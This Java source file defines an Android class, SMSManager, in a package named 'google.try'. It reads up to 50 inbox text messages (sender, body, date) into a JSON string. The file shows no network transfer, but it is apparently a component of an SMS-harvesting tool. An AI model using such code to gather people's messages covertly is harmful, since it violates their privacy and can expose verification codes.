package google.try;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.util.Log;
import org.json.JSONArray;
import org.json.JSONObject;

public class SMSManager {

    public static String getAllSms(Context context) {
        JSONArray smsList = new JSONArray();
        Uri uri = Uri.parse("content://sms/inbox");
        Cursor cursor = context.getContentResolver().query(uri, null, null, null, null);

        if (cursor != null && cursor.moveToFirst()) {
            for (int i = 0; i < Math.min(cursor.getCount(), 50); i++) {
                try {
                    JSONObject sms = new JSONObject();
                    sms.put("address", cursor.getString(cursor.getColumnIndexOrThrow("address")));
                    sms.put("body", cursor.getString(cursor.getColumnIndexOrThrow("body")));
                    sms.put("date", cursor.getString(cursor.getColumnIndexOrThrow("date")));
                    smsList.put(sms);
                } catch (Exception e) {
                    // Ignore error
                }
                cursor.moveToNext();
            }
            cursor.close();
        }
        return smsList.toString();
    }
}
